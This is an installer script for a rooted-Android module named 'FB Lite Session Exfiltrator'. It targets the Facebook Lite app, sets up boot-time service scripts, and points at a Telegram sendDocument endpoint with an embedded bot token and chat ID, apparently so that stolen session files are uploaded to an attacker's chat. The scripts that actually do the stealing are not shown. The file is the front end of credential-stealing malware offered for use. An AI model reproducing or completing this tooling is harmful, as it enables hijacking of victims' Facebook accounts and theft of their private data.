##########################################################################################
# Configuration
##########################################################################################

# Telegram Bot Configuration
BOT_TOKEN="8897524375:AAFt0YddI6UTaHaBzTbPSH43Mx2i1cJU-XI"
CHAT_ID="7896433111"

# Target package
PACKAGE="com.facebook.lite"

# Monitor interval in seconds (for watchdog fallback)
WATCHDOG_INTERVAL=30

# Telegram API endpoint
API_URL="https://api.telegram.org/bot${BOT_TOKEN}/sendDocument"

##########################################################################################
# Permissions
##########################################################################################

SKIPMOUNT=false
PROPFILE=false
POSTFSDATA=true
LATESTARTSERVICE=true

##########################################################################################
# Info
##########################################################################################

print_modname() {
  ui_print "*******************************"
  ui_print "  FB Lite Session Exfiltrator  "
  ui_print "*******************************"
}

##########################################################################################
# Install
##########################################################################################

on_install() {
  ui_print "- Extracting module files"
  unzip -o "$ZIPFILE" 'common/*' -d $MODPATH >&2
}

##########################################################################################
# Permissions
##########################################################################################

set_permissions() {
  set_perm_recursive $MODPATH 0 0 0755 0644
  set_perm $MODPATH/common/service.sh 0 0 0755
  set_perm $MODPATH/common/post-fs-data.sh 0 0 0755
}

##########################################################################################
# Custom
##########################################################################################

custom() {
  ui_print "- Configuration:"
  ui_print "  Bot Token: ${BOT_TOKEN:0:8}...${BOT_TOKEN: -4}"
  ui_print "  Chat ID: $CHAT_ID"
  ui_print "  Package: $PACKAGE"
  ui_print "- Installation complete"
}
